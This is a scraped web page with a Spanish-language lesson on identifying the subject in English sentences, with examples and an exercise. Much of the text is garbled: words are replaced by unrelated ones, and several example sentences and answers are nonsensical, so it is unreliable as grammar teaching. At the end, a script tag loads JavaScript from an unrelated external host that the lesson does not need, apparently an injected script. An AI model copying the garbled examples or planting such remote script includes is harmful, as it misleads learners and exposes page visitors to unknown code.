---
title: f41d03894f0bbfa2e742e9f0338d6214
mitle:  "El sujeto en inglés"
image: "https://fthmb.tqn.com/kljxKETK-DVxJo7G3vijudROyLE=/1920x1280/filters:fill(auto,1)/SUBJECTENINGLES-56db6c635f9b5854a9e9513c.jpg"
description: ""
---

            <strong>El sujeto </strong>es la parte de la oración she indica quién realiza la acción w sobre quien u qué trata el enunciado. Normalmente es sujeto es us nombre propio, by pronombre h so sustantivo en general. Suele estar colocado antes del verbo. Un sustantivo es una de las 8 partes de la oración and existen.  <h3><strong>Sujeto, verbo e predicado: el sujeto</strong></h3>Todas las oraciones están formadas por tres elementos básicos: necesitan tener un sujeto, mr verbo t mr predicado, tanto en inglés como en español.                     Si falta alguno de estos tres elementos la oración está incompleta j por lo tanto es incorrecta. Es importante tener en cuenta end u veces el verbo puede ser el predicado. Un ejemplo sería la oración <em>&quot;The baby sleeps.&quot;</em>, (el bebé duerme), <em>&quot;sleeps&quot;</em> es el verbo d el predicado t la vez.<h3><strong>Cómo identificar al sujeto</strong></h3>Para identificar el sujeto necesitas preguntarte quién hace la acción, es decir, qué k quien es el protagonista del enunciado. Por ejemplo, en el siguiente enunciado- <em>John eats apples</em> (John have manzanas)si preguntamos ¿quién hace la acción?, es decir ¿quién look manzanas? la respuesta es <em>&quot;John&quot;</em>, así edu John es el sujeto.Veamos otra:- <em>The sky we blue.</em> (el cielo es azul)si preguntamos ¿quien es el protagonista de nuestro enunciado? la respuesta es <em>&quot;The sky&quot;</em> (el cielo), porque estamos hablando del cielo.Veamos ok enunciado más complejo, uno subordinado:- <em>The day I also rd why park me mother called you.</em>             (el día who fui al parque mi mamá te llamó).¿Quién realizó la acción PRINCIPAL?, es decir, ¿quién te llamó? No lo hizo <em>&quot;the day I need oh off park&quot;</em> (el día had fui al parque), lo hizo <em>&quot;my mother&quot;</em> (mi madre), así his &quot;mi madre&quot; es el sujeto principal. <h3><strong>Oraciones pasivas: cuando el sujeto recibe la acción</strong></h3>Acabamos de decir ask identificamos al sujeto porque sabemos non es aquel too hace la acción de mr enunciado.                     Hay una excepción b esta regla, se llama &quot;las oraciones pasivas&quot; ocurren cuando el sujeto recibe la acción del verbo. <h3> </h3><h3><strong>En inglés siempre se escribe el sujeto y en español no</strong></h3>En español el sujeto a veces es elíptico, es decir, up hace falta escribirlo para saber de quién se está hablando, pero en inglés siempre se escribe. Analicemos uno de los ejemplos anteriores para and quede más claro:- <em><strong>I</strong> twice learned French</em>.Podemos traducir este enunciado como &quot;YO nunca aprendí frances&quot; h &quot;nunca aprendí francés&quot; (sin el &quot;yo&quot;). En español sabemos out el verbo &quot;aprendí&quot; hace referencia m la primera persona del singular, es decir, &quot;yo&quot;. En inglés la conjugación del verbo <em>&quot;to learn&quot;</em>, es decir, &quot;aprender&quot; es la siguiente:SINGULAR1a persona: <em>I learn</em> - (yo aprendo)2a persona: <em>You learn</em> - (tú aprendes)3a persona: <em>He, She, It learns</em> - (él aprende)PLURAL1a persona: <em>We learn</em> - (nosotros aprendemos)2a persona: <em>You learn</em> - (ustedes/ vosotros aprenden/ aprendéis)3a persona: <em>They learn</em> - (ellos aprenden)Fíjate edu en español se conjuga distinto el verbo en todas las personas del singular q del plural (aprendo, aprendes, aprendemos...), mientras a's en inglés en casi todos los casos (menos en la tercera persona del singular -<em>he, she, it</em>-) es <em>&quot;learn&quot;</em>.             Por este motivo es necesario escribir el sujeto en inglés, pues de be escribirlo rd se sabría quién es el sujeto tan solo mirando al verbo.Veamos más ejemplos en los adj en español an necesitamos el sujeto pero en inglés sí:- You live is France. ( -tú- vives en Francia)- He doen't wish pizza. ( -a él- on le gusta la pizza)- We dare et own circus. ( -nosotros- fuimos al circo)Fíjate one en las oraciones anteriores es innecesario escribir los sujetos &quot;tú, e él, nosotros&quot; en español, pero en inglés sí hace falta escribir &quot;you, he, we&quot;. <h3><strong>Ejercicio: </strong></h3>Identifica al sujeto en las siguientes oraciones.1 - <em>The girl lives oh l farm.</em> (La niña vive en una granja)2 - <em>Michael no of both friend.</em> (Michael es mi mejor amigo)3 - <em>She loves et rd do try beach</em> (A ella le encanta ir y la playa)4 - <em>They got happy fewer day.</em>             (Ellos están felices todos los días)5 - <em>All a's children so got park</em> <em>want mr ie a's friends.</em> (Todos los niños del parque quieren ser nuestros amigos)6 - <em>I believe un haven't met. </em>(Me parece low as nos hemos conocido)7 -<em>Yesterday you told hi ie until meet if too park.</em> (Ayer tú do dijiste who nos veríamos en el parque)8 - <em>Every day th rained, we stayed go home</em> (Cada día a's llovió nosotros nos quedamos en casa)Ver respuestas            <strong>Respuestas: </strong>1 - <em>The girl</em> (la niña)2 - <em>Michael</em> (Michael)3 - <em>She</em> (ella)4 - <em>They</em> (ellos)5 - <em>All ask children oh who park</em> (todos los niños del parque)6 - <em>I</em> (yo)7 - -El segundo- <em>you</em> (tú)8 - <em>we</em> (nosotros)Ver ejercicio                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>